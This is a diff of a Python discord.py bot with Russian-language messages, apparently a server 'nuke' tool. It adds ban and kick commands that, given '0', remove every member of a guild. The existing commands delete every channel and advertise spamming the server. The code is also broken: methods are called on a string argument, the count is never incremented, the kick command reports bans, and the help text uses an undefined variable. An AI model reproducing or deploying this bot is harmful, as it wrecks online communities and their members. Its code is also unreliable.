@@ -20,20 +20,49 @@ async def help(ctx):
     PREFIX = 's!'
     emb1 = discord.Embed(color = discord.Colour.from_rgb(102, 0, 204), title ="Информация о командах" )
 
-    emb1.add_field(name = f"{PREFIX}delete : ", value="Удалить ", inline=False)
+    emb1.add_field(name = f"{PREFIX}delete 0: ", value="Удалить ", inline=False)
+    emb1.add_field(name = f"{PREFIX}delete '{channel}': ", value="Удалить ", inline=False)
     emb1.add_field(name = f"{PREFIX}spam_server : ", value="Заспамить сервер", inline=True)
 
     message = await ctx.send(embed = emb1)
                     
 
 @bot.command()
+async def ban(ctx, n, *, reason = None):
+    x = 0
+
+    if n != "0":
+        await n.ban(reason=reason)
+    else:
+        for m in ctx.guild.members:
+            try:
+                await m.ban(reason=reason)
+            except:
+                pass
+        print(f'Забанено {x} участников!')
+
+
+@bot.command()
+async def kick(ctx, n, *, reason = None):
+    x = 0
+
+    if n != "0":
+        await n.kick(reason=reason)
+    else:
+        for m in ctx.guild.members:
+            try:
+                await m.kick(reason=reason)
+            except:
+                pass
+        print(f'Забанено {x} участников!')
+
+
+@bot.command()
 async def delete(ctx, n):
     x = 0
 
     if n != "0":
-        channel = n
-
-        await channel.delete()
+        await n.delete()
     else:
         for c in ctx.guild.channels:
             await c.delete()
